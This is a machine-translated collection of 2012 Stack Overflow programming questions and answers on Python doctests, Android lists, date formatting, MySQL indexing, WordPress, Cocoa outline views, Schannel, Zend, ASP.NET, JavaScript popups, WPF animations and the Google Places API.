我编写了一个`assert_raised`用于测试的上下文管理器，它检查是否引发了预期的异常，如果没有引发`AssertionError`. 我还编写了一个 doctest 来测试它，但是 doctest 一直失败，我不完全确定为什么。这是文档测试：

```
>>> for e in [TypeError, ValueError, KeyError]:
...     with assert_raised(TypeError, ValueError):
...         print('Raising {}...'.format(e.__name__))
...         raise e
Raising TypeError...
Raising ValueError...
Raising KeyError...
Traceback (most recent call last):
    ...
AssertionError: Got 'KeyError', expected 'TypeError, ValueError' 
```

引发的实际异常是：

```
Traceback (most recent call last):
  File "<doctest dtlibs.mock.assert_raised[3]>", line 4, in <module>
    raise e
KeyError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Python32\lib\doctest.py", line 1253, in __run
    compileflags, 1), test.globs)
  File "<doctest dtlibs.mock.assert_raised[3]>", line 4, in <module>
    raise e
  File "G:\Projects\Programming\dt-tools\dtlibs\dtlibs\mock.py", line 274, in __exit__
    raise self._exception(exc_type.__name__)
AssertionError: Got 'KeyError', expected 'TypeError, ValueError' 
```

我认为实现并不重要，但如果我在那里做错了什么（没有 doctest）：

```
class assert_raised:

    def __init__(self, *exceptions):
        self.exceptions = exceptions

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if exc_type is None:
            raise self._exception('None')
        elif self.exceptions and exc_type not in self.exceptions:
            raise self._exception(exc_type.__name__)
        return True

    def _exception(self, got):
        if len(self.exceptions) == 0:
            expected = 'an exception'
        else:
            expected = ', '.join(e.__name__ for e in self.exceptions)
        msg = "Got '{}', expected '{}'".format(got, expected)
        return AssertionError(msg) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T07:22:50.397

Doctests 有处理引发异常的特殊代码。因此，它会识别输出何时是异常。为了识别这一点，预期的输出必须以单词开头`Traceback`。您的预期输出不是以此开头的，因此，doctest 不会将输出识别为预期异常，因此，它不会预期异常，因此当异常出现时，它将失败。

您可以通过三种方式解决此问题：

1.  去掉`Raising XXXError...`部分输出。[懒惰的]

2.  为 doctest 实施特殊的输出过滤器，使 doctest 可以忽略`Raising XXXError...`-part [复杂]

3.  停止将 doctest 用于测试文档以外的其他事情。[正确的]

上面的代码显然*不是*如何使用这个上下文管理器的示例代码，它是测试上下文管理器工作的代码。这样的测试不应该是 doctests。Doctests 是痛苦和有限的，应该只用于测试文档。

# android - 幻灯片展开动画

> ID：10084238
> 
> 赞同：1
> 
> 时间：2012-04-10T06:41:30.003
> 
> 标签：android, android-animation

我有 5 个仅包含标题的布局，它们垂直对齐，类似于列表，但不是列表。我想在单击时向下滑动每个布局，以显示详细信息，以便下一个标题应遵循当前详细信息。如何我在android中实现了这个。任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T06:48:14.013

如果您正在寻找可扩展的 listView，这些链接可能会有所帮助，

[http://about-android.blogspot.in/2010/04/steps-to-implement-expandablelistview.html](http://about-android.blogspot.in/2010/04/steps-to-implement-expandablelistview.html)

[http://developer.android.com/resources/samples/ApiDemos/src/com/example/android/apis/view/ExpandableList1.html](http://developer.android.com/resources/samples/ApiDemos/src/com/example/android/apis/view/ExpandableList1.html)

```
 public class MyExpandableListAdapter extends BaseExpandableListAdapter {
// Sample data set. children[i] contains the children (String[]) for
// groups[i].
private String[] groups = { "Parent1", "Parent2",
    "Parent3" };
private String[][] children = { { "Child1" },{ "Child2" }, { "Child3" },{ "Child4" }, { "Child5" } };

public Object getChild(int groupPosition, int childPosition) {
    return children[groupPosition][childPosition];
}

public long getChildId(int groupPosition, int childPosition) {
    return childPosition;
}

public int getChildrenCount(int groupPosition) {
    int i = 0;
    try {
    i = children[groupPosition].length;

    } catch (Exception e) {
    }

    return i;
}

public TextView getGenericView() {
    // Layout parameters for the ExpandableListView
    AbsListView.LayoutParams lp = new AbsListView.LayoutParams(
        ViewGroup.LayoutParams.FILL_PARENT, 64);

    TextView textView = new TextView(MainActivity.this);
    textView.setLayoutParams(lp);
    // Center the text vertically
    textView.setGravity(Gravity.CENTER_VERTICAL | Gravity.LEFT);
    textView.setTextColor(R.color.marcyred);
    // Set the text starting position
    textView.setPadding(36, 0, 0, 0);
    return textView;
}

public View getChildView(int groupPosition, int childPosition,
    boolean isLastChild, View convertView, ViewGroup parent) {
    TextView textView = getGenericView();
    textView.setText(getChild(groupPosition, childPosition).toString());
    return textView;
}

public Object getGroup(int groupPosition) {
    return groups[groupPosition];
}

public int getGroupCount() {
    return groups.length;
}

public long getGroupId(int groupPosition) {
    return groupPosition;
}

public View getGroupView(int groupPosition, boolean isExpanded,
    View convertView, ViewGroup parent) {
    TextView textView = getGenericView();
    textView.setText(getGroup(groupPosition).toString());
    return textView;
}

public boolean isChildSelectable(int groupPosition, int childPosition) {
    return true;
}

public boolean hasStableIds() {
    return true;
}

} 
```

# ios - 使用 NSDateFormatter 格式化月份和年份返回无效日期

> ID：10084242
> 
> 赞同：9
> 
> 时间：2012-04-10T06:42:01.180
> 
> 标签：ios, nsdateformatter

我已经设置了语言环境和时区，但是当我格式化日期时，我总是得到无效的日期。月份始终为 12 月，年份比指定年份小一。就我而言，我不需要白天组件。

我检查了其他类似的帖子，但没有解决问题。

任何帮助表示赞赏。谢谢你。

这是代码：

```
NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init]; 
dateFormatter.locale = [[[NSLocale alloc] initWithLocaleIdentifier:@"en_US"] autorelease]; 
dateFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"GMT"]; 
[dateFormatter setDateFormat:@"MMM YYYY"];
NSDate *formattedDate = [dateFormatter dateFromString:@"Sep 2013"];
NSLog(@"Date: %@", [dateFormatter stringFromDate:formattedDate]);
[dateFormatter release]; dateFormatter = nil; 
```

**输出：日期：2012 年 12 月**

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-10T06:58:46.187

“YYYY”格式用于基于“一年中的一周”的日历。改用“yyyy”格式说明符：

```
[dateFormatter setDateFormat:@"MMM yyyy"]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-04T23:47:49.240

我只是想为弗拉基米尔的出色回答添加一些内容。如果您在设置语言环境之前执行此操作，日期格式似乎会变得疯狂。我必须做的是在设置新格式之前设置语言环境，然后使用`setDateFormat`来根据使用的语言环境更改格式。所以这样的事情会做：

```
NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
[formatter setLocale:[NSLocale currentLocale]];//I wanted to set the locale to wherever user is using my app in
[formatter setDateFormat:@"MMM YYYY"];
NSDate *now = [NSDate Date];
NSString *fancyLookingDate = [formatter stringFromDate:now]; 
```

# coffeescript - 在咖啡脚本中将数组转换为字符串并返回数组

> ID：10084243
> 
> 赞同：1
> 
> 时间：2012-04-10T06:42:04.647
> 
> 标签：coffeescript

我在咖啡脚本中有一组数组。如何以简单的方式将其转换为字符串然后返回数组？所以我期待这样。使用 eval 在 ruby​​ 中很容易做到这一点。如何在 coffe 脚本中实现这一点？提前致谢。

```
"[[2,3,4],[2,3,4],[4,6,7]]" =>string
and then [[2,3,4],[2,3,4],[4,6,7]] back to an array again 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-10T08:25:40.650

虽然理论上您也可以在 javascript/coffeescript 中使用 eval，但您可能不应该这样做。更好的解决方案可能是使用 JSON，例如：

`coffee -e 'console.log JSON.parse(JSON.stringify([[1,2,3],[4,5,6]]));'`

输出：

`[ [ 1, 2, 3 ], [ 4, 5, 6 ] ]`

# mysql - Mysql 表或查询优化

> ID：10084248
> 
> 赞同：1
> 
> 时间：2012-04-10T06:42:46.530
> 
> 标签：mysql, sql, full-text-search

我正在运行以下查询，但是我更改了它，它仍然需要将近 5 秒才能运行，这是完全不可接受的......

查询：

```
SELECT cat1, cat2, cat3, PRid, title, genre, artist, author, actors, imageURL, 
lowprice, highprice, prodcatID, description
from products
where title like '%' AND imageURL <> '' AND cat1 = 'Clothing and accessories'
order by userrating desc
limit 500 
```

我试过去掉“like %”，去掉“imageURl <> ''”，但还是一样。我试过只返回 1 列，还是一样。

我对表中几乎每一列都有索引，当然是查询中提到的所有列。

这基本上是针对类别列表的。如果我对具有全文索引的标题列中的内容进行全文搜索，则只需不到一秒钟的时间。

我是否应该向列 cat1 添加另一个全文索引并将查询焦点更改为该列上的“匹配”？

我期待太多了吗？

该表只有不到 300 万行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:49:27.850

您应该将 cat1 作为整数，然后在这 300 万行中使用字符串。您还必须正确索引。如果索引所有列只得到改进，那么这将是系统默认的做法。

除此之外，`title LIKE '%'`什么都不做。我猜你用它来搜索所以它变成了``title LIKE 'search%'`

你使用任何类型的框架来获取这个吗？如果你的框架将它保存到一个大数组中，那么获得 500 行和很多列可能会耗尽系统。可能不是这样，但是：
尝试运行一个普通的`$query = mysql_query()`and `while($row = mysql_fetch_object($query))`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:52:15.680

你说你在每一列都有一个索引。你有索引吗？

```
alter table products add index (cat1, userrating) 
```

如果您不这样做，请尝试一下。运行该查询并让我知道它是否运行得更快。

另外，我假设您实际上是在设置某种过滤器而不是`%`在标题、字段上，对吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T06:49:33.400

我建议添加一个包含查询列的索引：title、imageURL 和 cat1。第二个改进：使用SQL服务器缓存，它会致命地提高速度。最后的改进：如果你查询总是这样，只有值改变，然后使用准备好的语句。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T06:53:47.317

好吧，我很确定 a`%`作为`LIKE`子句中的第一个字符，会为您提供对该列的全表扫描（在您的情况下，您将不会执行全表扫描，因为您已经在子句中有限制`AND`子句）。除此之外，尝试在`cat1`列上添加索引。此外，尝试向您的查询添加其他条件，以减少数据集的大小 - 您的工作数据集（与您的查询匹配的行数，没有`LIMIT`子句）也可能太大。

# php - 在屏幕上调用 get_post_custom 输出 38

> ID：10084249
> 
> 赞同：0
> 
> 时间：2012-04-10T06:42:55.120
> 
> 标签：php, wordpress

当我在循环中调用 get_post_custom 时，它可以正常工作。但它在我的屏幕上打印 38。这是一个wp错误还是什么？我该如何解决？

更多信息：当我调用 get_post_meta 时也会发生这种情况。我正在使用自定义字段模板插件。

```
$args = array(
        'post_type' => 'attendeeaddress',
        'meta_query' => array(
            array(
                'key' => 'MEETING_ID',
                'value' => $meeting_id,
                'meta_compare' => '='
            )
        )
    );
    $wpquery = new WP_Query($args);
    $addresses = array();
    while ( $wpquery->have_posts() ) : $wpquery->the_post();
        $custom_val = get_post_custom(the_ID());
        $addresses[] = array(
            "address" => $custom_val["MEETING_ADDRESS"][0],
            "meeting_id" => $meeting_id,
            "lat" => $custom_val["MEETING_LAT"][0],
            "lon" => $custom_val["MEETING_LON"][0],
            "name" => $custom_val["NAME"][0]
        );
    endwhile;

    return $addresses; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:01:21.277

这是因为**the_ID();** 实际上“呼应”了价值。

要仅收集值，请使用**get_the_ID()**；

[http://codex.wordpress.org/Function_Reference/the_ID](http://codex.wordpress.org/Function_Reference/the_ID) http://codex.wordpress.org/Function_Reference/get_the_ID

*   您只能在循环中使用它。

# objective-c - 如何制作一个简单的基于视图的 NSOutlineView？

> ID：10084254
> 
> 赞同：12
> 
> 时间：2012-04-10T06:43:09.650
> 
> 标签：objective-c, cocoa, nsoutlineview

出于学习目的，我想将基于单元的 NSOutlineView 转换为基于视图的，

基本上我想要以下内容：

*   而不是普通的单元格，我想要一个“图像和文本表格单元格视图”
*   图片可以是股票 NSApplicationIcon，文字可以是“hello world”:)
*   我想在不使用绑定的情况下做到这一点，并且`NSTreeController`

这是“世界上最简单的 NSOutlineView”示例[http://www.cocoasteam.com/Cocoa_Steam/Worlds_Simplest_Demo.html](http://www.cocoasteam.com/Cocoa_Steam/Worlds_Simplest_Demo.html)

我想知道是否有人可以修改它以使其基于视图并像我上面所说的那样工作:) :)

我试过看苹果的例子，并在互联网上的其他地方搜索，但我仍然无法让它工作 - 所以提前非常感谢:)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-10-11T13:03:48.677

我创建了一个小示例项目，它就是这样做的。

*   显示项目列表
*   以主从方式编辑项目
*   删除和添加项目
*   绑定的使用

查看github 上[的 besi/mac-quickies](http://github.com/besi/mac-quickies/)。大多数东西要么在 IB 中完成，要么可以在[AppDelegate中找到](https://github.com/besi/mac-quickies/blob/master/OutlineView/OutlineView/AppDelegate.m)

![截屏](../Images/83e455f395c1d6009ab4731fa2c52e92.png)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-23T06:39:42.470

好的，所以你想要一个`NSOutlineView`带有`ImageAndTextCell`细胞的，对吧？

让我们做一个最典型的例子：一个简单的文件浏览器。

**我们需要什么：**

*   一个`NSOutlineView`（为您的 AppDelegate 设置一个大纲，如`fileOutlineView`）
*   使用以下标识符在大纲中创建 3 列（在 Interface Builder中设置它们）：`NameColumn`、、、`SizeColumn``ModifiedColumn`

现在，至于其余部分，我将以编程方式完成所有操作，以便您对正在发生的事情有一个很好的了解......

**如何设置它（例如 in `- (void)awakeFromNib`）：**

```
// set the Data Source and Delegate
[fileOutlineView setDataSource:(id<NSOutlineViewDataSource>)self];
[fileOutlineView setDelegate:(id<NSOutlineViewDelegate>)self];

// set the first column's cells as `ImageAndTextCell`s
ImageAndTextCell* iatc = [[ImageAndTextCell alloc] init];
[iatc setEditable:NO];
[[[fileOutlineView tableColumns] objectAtIndex:0] setDataCell:iatc]; 
```

**连接点：**

```
/*******************************************************
 *
 * OUTLINE-VIEW DATASOURCE
 *
 *******************************************************/

- (BOOL)outlineView:(NSOutlineView *)outlineView isItemExpandable:(id)item
{        
    if ([item isFolder])
        return YES;
    else
        return NO;
}

- (NSInteger)outlineView:(NSOutlineView *)outlineView numberOfChildrenOfItem:(id)item
{    
    if (item==nil)
    {
        // Root
        return [[filePath folderContentsWithPathAndBackIgnoringHidden] count];
    }
    else
    {        
        if ([item isFolder])
        {
            return [[item folderContentsWithPathAndBackIgnoringHidden] count];
        }
        else
        {
            return 0;
        }
    }
}

- (id)outlineView:(NSOutlineView *)outlineView child:(NSInteger)index ofItem:(id)item
{
    if (item == nil)
    { 
        // Root
        return [[filePath folderContentsWithPathAndBackIgnoringHidden] objectAtIndex:index];
    }

    if ([item isFolder])
    {
        return [[item folderContentsWithPathAndBackIgnoringHidden] objectAtIndex:index];
    }

    // File
    return nil;
}

- (id)outlineView:(NSOutlineView *)outlineView objectValueForTableColumn:(NSTableColumn *)theColumn byItem:(id)item
{          
    if ([[theColumn identifier] isEqualToString:@"NameColumn"])
    {
        return [item lastPathComponent];
    }
    else if ([[theColumn identifier] isEqualToString:@"SizeColumn"])
    {
        if ([item isFolder]) return @"--";
        else return [NSString stringWithFormat:@"%d",[item getFileSize]];
    }
    else if ([[theColumn identifier] isEqualToString:@"ModifiedColumn"])
    {
        if ([item isFolder]) return @"";
        else return [NSString stringWithFormat:@"%@",[item getDateModified]];
    }

    // Never reaches here
    return nil;
}

/*******************************************************
 *
 * OUTLINE-VIEW DELEGATE
 *
 *******************************************************/

- (BOOL)outlineView:(NSOutlineView *)outlineView shouldSelectItem:(id)item
{
    return YES;
}

- (BOOL)outlineView:(NSOutlineView *)outlineView isGroupItem:(id)item
{
    return NO;
}

- (void)outlineView:(NSOutlineView *)outlineView willDisplayCell:(id)cell forTableColumn:(NSTableColumn *)tableColumn item:(id)item {
    [cell setDrawsBackground:NO];

    if ([item isFileHidden]) [cell setTextColor:[NSColor grayColor]];
    else [cell setTextColor:[NSColor whiteColor]];

    if ([[tableColumn identifier] isEqualToString:@"NameColumn"])
    {
        if ([item isFolder])
            [cell setImage:[[NSWorkspace sharedWorkspace] iconForFileType:NSFileTypeForHFSTypeCode(kGenericFolderIcon)] size:15.0];
        else
            [cell setImage:[[NSWorkspace sharedWorkspace] iconForFile:item] size:15.0];

        if ([item isFileHidden])
        {
            [cell setFileHidden:YES];
        }
        else
        {
            [cell setFileHidden:NO];
        }

    }

} 
```

* * *

***提示：****类可以在**[这里](http://developer.apple.com/library/mac/#samplecode/SourceView/Listings/ImageAndTextCell_m.html)**找到。**您还会注意到我正在使用的其他一些方法，显然 Cocoa 不支持这些方法（例如**，**或**），但自己实现它们并不难......）* *`ImageAndTextCell``isFileHidden``isFolder``folderContentsWithPathAndBackIgnoringHidden`*

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-29T07:42:58.453

将视图返回到 OutlineView 列而不是使用返回 objectValue 的数据源方法：

```
- (id)outlineView:(NSOutlineView *)outlineView objectValueForTableColumn:(NSTableColumn *)theColumn byItem:(id)item 
```

使用返回视图的数据源方法！！！！！！！！！：

```
- (NSView *)outlineView:(NSOutlineView *)outlineView viewForTableColumn:(NSTableColumn *)tableColumn item:(id)item 
```

其他一切都是一样的（最小的 req 是前三个数据源方法，你不需要委托方法）但是，你不能使用 willdisplaycell 它只为基于单元格调用，像这样在 viefortablecolumn 方法中对视图执行所有操作：

```
if ([[tableColumn identifier] isEqualToString:@"YourColumnIdentifier"]){
    NSTableCellView *cell = [outlineView makeViewWithIdentifier:@"YourViewsIdentifier" owner:self];
    [cell.textField setStringValue:[(YourItem *)item name]];
    [cell.imageView setImage:[(YourItem *)item image]];
    return cell;
}

return nil; 
```

并且不要忘记设置标识符，并将 OutlineView 设置为基于视图（在 IB 中 ...）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T08:23:50.043

检查[TableViewPlayground](http://developer.apple.com/library/mac/#samplecode/TableViewPlayground/Introduction/Intro.html)， 以及 WWDC 2011*的 View Based NSTableView Basic to Advanced*。

# windows - SSPI Schannel API - 可以重复使用凭据句柄吗？

> ID：10084257
> 
> 赞同：0
> 
> 时间：2012-04-10T06:43:18.203
> 
> 标签：windows, winapi, curl, sspi, schannel

我目前正在向 libcurl 添加 SSPI Schannel API 支持，以便可以在 Windows 上使用启用 SSL 的协议，而无需任何外部依赖，例如 OpenSSL。

我已经有一个有效的 SSL/TLS 实现，但我有一个非常具体的问题，即重用由函数[AcquireCredentialsHandle](http://msdn.microsoft.com/en-us/library/windows/desktop/aa374716.aspx)返回的凭据句柄。

通过创建新句柄、重新使用现有句柄并将其多次传递给[InitializeSecurityContext来重复使用 SSL/TLS 会话是否正确且可能？](http://msdn.microsoft.com/en-us/library/windows/desktop/aa375924.aspx)

我在 libcurl 的 Schannel 模块上的工作可以在[这里](https://github.com/mback2k/curl/compare/schannel)找到，尝试重用的实验版本可以在[这里](https://github.com/mback2k/curl/compare/schannel_exp)找到。

我将不胜感激有关此问题的任何提示或反馈。那么，凭证句柄可以以这种方式重复使用吗？它是正确的吗？

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T15:13:06.960

我找到了我的问题的答案并在这里记录下来供其他人使用：

1.  以前有人问过，第一个答案可以在[这里](https://stackoverflow.com/questions/905851/ssl-session-reuse-with-schannel-windows)找到。
2.  可以在[此 MSDN 页面](http://msdn.microsoft.com/en-us/library/windows/desktop/aa378812.aspx)上找到以下信息：

> 您的应用程序通过调用[AcquireCredentialsHandle](http://msdn.microsoft.com/en-us/library/windows/desktop/aa374712.aspx)函数获取凭据，该函数返回请求凭据的句柄。因为凭据句柄用于存储配置信息，所以不能将同一句柄用于客户端和服务器端操作。这意味着同时支持客户端和服务器连接的应用程序必须至少获得两个凭据句柄。

因此，可以假设为多个连接重复使用相同的凭据句柄是安全的。而且我证实它确实使 Schannel 重新使用 SSL/TLS 会话。这已在 Windows 7 Professional SP1 上进行了测试。

# php - 使用 Zend_From 上传时更改文件名

> ID：10084259
> 
> 赞同：1
> 
> 时间：2012-04-10T06:43:28.273
> 
> 标签：php, zend-framework, file-upload, zend-form, zend-form-element

我想更改上传文件名。下面是我写的代码：

```
 $upload = new Zend_File_Transfer_Adapter_Http();
 $upload->setDestination(IMAGE_PHY_PATH);
 try { 
    //upload received file(s)
    $upload->addFilter('Rename', array('target'    => IMAGE_PHY_PATH."1.jpg",
                                       'overwrite' => true));
    $upload->receive();
 } catch (Zend_File_Transfer_Exception $e) {
    $e->getMessage();
 } 
```

谁能告诉我我的代码有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:03:16.267

```
$rename = new Zend_Filter_File_Rename(array(
    'target'    => IMAGE_PHY_PATH . '1.jpg',
    'overwrite' => true
));

$upload->addFilter($rename); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T20:56:43.593

Try `realpath(IMAGE_PHY_PATH)`. This should produce an absolute pathname (ex: `$adapter->setDestination('C:\temp')`).

After this check to see if the path exists and is writable. Normally setDestination should throw an exception if not so. If the path is correct call $form->getValues() after the try/catch block.

# asp.net - 服务器如何识别按钮控件的视图状态发生了变化

> ID：10084263
> 
> 赞同：-2
> 
> 时间：2012-04-10T06:43:55.170
> 
> 标签：asp.net

嗨，提交按钮单击事件信息是否存储在 _viewstate 属性中（在页面源中）。如果是，服务器如何识别从视图状态单击的按钮并执行相应的事件处理程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:04:49.307

对于按钮单击事件，它以两种方式发生。

一个。如果 javascript 可用且 UseSubmitBehavior 设置为 false，则它会使用按钮的唯一 id 填充 __EventTarget 隐藏字段。当页面正在处理回发时，它会在 Request.Forms 中查找此 __EventTarget，如果可用，则执行 FindControl 以将相应的值和类型强制转换为 IPostBackEventHandler 并调用 RaisePostBackEvent 方法。然后按钮类将触发 Click 事件。

湾。如果 Javascript 不可用且 UseSubmitBehavior 设置为 true，则浏览器将按钮的唯一 ID 作为表单变量发送到服务器。如果 Page 找到 UniqueId 作为 Request.Forms 中的键，那么它将再次使用 FindControl 方法找到控件并转换为 IPostBackEventHandler 并调用 RaisePostBackEvent 方法。然后按钮类将触发 Click 事件。

# javascript - 如何在javascript中将div添加到弹出窗口？

> ID：10084266
> 
> 赞同：2
> 
> 时间：2012-04-10T06:44:23.903
> 
> 标签：javascript

我在javascript中使用以下代码创建了一个弹出窗口；

```
 window.open("http://google.com", "myWindow", "status = 1, height = 300, width = 300, resizable = 0"); 
```

我需要将以下动态 div 添加到该弹出窗口。

```
 <div><img src="/images/img1.jpg" /></div> 
```

上面的 div 是动态的，因为图像 src 会根据 url 中的查询字符串而有所不同

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T06:47:10.703

出于安全原因，您不能这样做。由于同源策略（而且 google.com 肯定不是您的域），您将无法访问其他窗口的 DOM。

如果弹出窗口来自同一个域，则返回值`window.open`将是对弹出窗口`window`对象的引用：[https ://developer.mozilla.org/en/DOM/window.open](https://developer.mozilla.org/en/DOM/window.open)

```
var popup = window.open("/relative path.html", ...);
popup.onload = function() { // of course you can use other onload-techniques
    jQuery(popup.document.body).append("<div />"); // or any other dom manipulation
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:49:37.063

只需使用以下代码：

a href="www.google.com" onclick="window.open(this.href, null, 'height=580, width=680, toolbar=0, location=0, status=1, scrollbars=1, resizable= 1'); 返回假"

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:08:19.703

正如bergi 所说，不要从外部域附加到DOM。但是对于同一个域（取自[这里](https://stackoverflow.com/questions/9581855/google-directions-only-in-pop-up-window)）

```
win=window.open('about:blank','instructions','width=300,height=200');
doc=win.document;
doc.open();
doc.write('<div id="instructions">instructions</div>');
doc.close();
//reference to the div inside the popup
//->doc.getElementById('instructions') 
```

[您也可以在此处](http://www.w3schools.com/jsref/met_win_open.asp)查看示例。

# c# - 加载故事板的所有效果，直到完成

> ID：10084267
> 
> 赞同：0
> 
> 时间：2012-04-10T06:44:24.190
> 
> 标签：c#, wpf

我有一个图像，当用户按下时，不透明度会逐渐消失，直到值为 0。但只有当用户按住图像时效果才会继续。是否有可能将代码更改为：当用户按下并且不按住按下时，不透明度褪色效果会保持不变？我希望在 XAML 中做到这一点。

```
<EventTrigger RoutedEvent="Button.Click" SourceName="press">
        <EventTrigger.Actions>
            <BeginStoryboard Storyboard="{StaticResource showA}"/>
        </EventTrigger.Actions>
    </EventTrigger>

<Button Grid.Column="5" Command="{Binding Path=PressC}" CommandParameter="dot" Style="{StaticResource TransparentButton}">
                <Button.Template>
                    <ControlTemplate TargetType="{x:Type Button}">
                        <Grid>
                            <Image Name="image5" Source="/W;component/Images/t.png" Height="100" />
                            <Image Name="pressed5" Source="/W;component/Images/T.png" Height="100" Width="200" Margin="-23,-136,-21,0" Visibility="Hidden" />
                        </Grid>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsPressed" Value="True">          
                                <Trigger.EnterActions>
                                    <BeginStoryboard>
                                        <Storyboard>
                                            <DoubleAnimation Storyboard.TargetName="pressed5" Storyboard.TargetProperty="Opacity" Duration="0:0:1.5" From="1" To="0"/>
                                        </Storyboard>
                                    </BeginStoryboard>
                                </Trigger.EnterActions>

                                <Setter Property="Panel.ZIndex" Value="999"/>                           
                                <Setter TargetName="pressed5" Property="Visibility" Value="Visible"/>                                    
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Button.Template>
            </Button> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:21:09.397

你能展示你的完整xaml吗？因为 Image 没有 IsPressed 属性，并且不清楚它是如何为您工作的。按钮的类似代码按预期工作：

```
<Button Background="Aquamarine">
<Button.Style>
  <Style TargetType="Button">
    <Style.Triggers>
      <Trigger Property="IsPressed" Value="True">
        <Trigger.EnterActions>
          <BeginStoryboard>
            <Storyboard>
              <DoubleAnimation Storyboard.TargetProperty="Opacity" Duration="0:0:1.5" From="1" To="0"/>
            </Storyboard>
          </BeginStoryboard>
        </Trigger.EnterActions>
      </Trigger>
    </Style.Triggers>
  </Style>
</Button.Style> 
```

对于 Image 它也适用于 EventTrigger：

```
<Image Source="d:\123.png">
<Image.Style>
  <Style TargetType="Image">
    <Style.Triggers>
      <EventTrigger RoutedEvent="MouseDown">            
          <BeginStoryboard>
            <Storyboard>
              <DoubleAnimation Storyboard.TargetProperty="Opacity" Duration="0:0:1.5" From="1" To="0"/>
            </Storyboard>
          </BeginStoryboard>            
      </EventTrigger>
    </Style.Triggers>
  </Style>
</Image.Style> 
```

# jquery - 将javascript中的数组发送到phpscript

> ID：10084269
> 
> 赞同：0
> 
> 时间：2012-04-10T06:44:28.830
> 
> 标签：jquery

在我的页面中，我需要将 javascript 中的数组发送到 Phpscript。我的代码没有返回值，也没有给出错误。我怎样才能做到这一点？

```
arr[0]='one';
arr[1]='two';
arr[2]='three';
arr[3]='four';

$.post(
       'sort2.php', 
       {data:arr}, 
       function(result) {
                         alert(result[0]);                  
       },
       'json' 
); 
```

在 sort2.php

```
$data=$_GET["arr"];
echo json_encode($data); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T06:53:27.020

1.  你在 PHP 脚本中搞混了`$_GET`。`$_POST`
2.  它应该是`$_POST['data']`，而不是`$_POST['arr']`（数组在 JavaScript 代码中`arr`的键名下传递： 。）`data``{data:arr}`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:00:38.580

你应该使用

```
$data=$_POST["arr"];
echo json_encode($data); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T06:52:41.543

您正在使用 POST 方法发送数据。你应该阅读`$_POST`数组

# web-services - Google Places API 中缺少结果

> ID：10084274
> 
> 赞同：2
> 
> 时间：2012-04-10T06:44:50.423
> 
> 标签：web-services, google-maps

使用谷歌地图在某些地理坐标附近搜索名为“Netto”的商店时

[http://maps.google.de/maps?q=netto+near+49.046054,8.380787+&hl=de&ll=49.047475,8.379607&spn=0.01194,0.027874&sll=49.046054,8.380787&sspn=0.011941,0.tto=m&78&78 16](http://maps.google.de/maps?q=netto+near+49.046054,8.380787+&hl=de&ll=49.047475,8.379607&spn=0.01194,0.027874&sll=49.046054,8.380787&sspn=0.011941,0.027874&hq=netto&t=m&z=16)

我正确地看到了两个结果。

但是，使用 Google Places API 进行相同的搜索

https://maps.googleapis.com/maps/api/place/search/json?location=49.046054,8.380787&radius=1000&sensor=false&keyword=netto&key=[keyremoved]

只产生一个结果：

```
{
   "html_attributions" : [],
   "results" : [
      {
         "geometry" : {
            "location" : {
               "lat" : 49.0459950,
               "lng" : 8.3811020
            }
         },
         "icon" : "http://maps.gstatic.com/mapfiles/place_api/icons/generic_business-71.png",
         "id" : "51b5bafdd6224ba1721c9708d59aa0ed7f8377e2",
         "name" : "Netto Marken-Discount AG & Co. KG",
         "reference" : "CoQBdwAAALWmu5j28xIY3s9oBL9Vs8vBCmcghvKWlV9HbHysvQgZ4tMmQ_awemt0k9CA3U9KTRa-CMWq1owOZL1cSLOjKIDb8LdHce3yhIJpJ2fsUnsnFFF1b02gnJK5m5e-4E85_5gTrPZhZIDYrrFenrGyBpWLHkYSFfn0Ir3_zOJlKVWeEhC3RsEsXWqDJ1yizMOR0gvVGhREdmbn0G6GYcAsm4jGJxgJeNbLiw",
         "types" : [ "establishment" ],
         "vicinity" : "Dürerstr. 3b, Karlsruhe"
      }
   ],
   "status" : "OK"
} 
```

查询中的半径为1000m，绝对足够（谷歌地图报告的距离<400m）。更改名称的关键字参数也无济于事。

https://maps.googleapis.com/maps/api/place/search/json?location=49.046054,8.380787&radius=1000&sensor=false&name=netto&key=[keyremoved]

我该怎么做才能得到这两个结果？

# asp.net - 如何更改下拉列表箭头的颜色？

> ID：10084276
> 
> 赞同：1
> 
> 时间：2012-04-10T06:45:06.537
> 
> 标签：asp.net

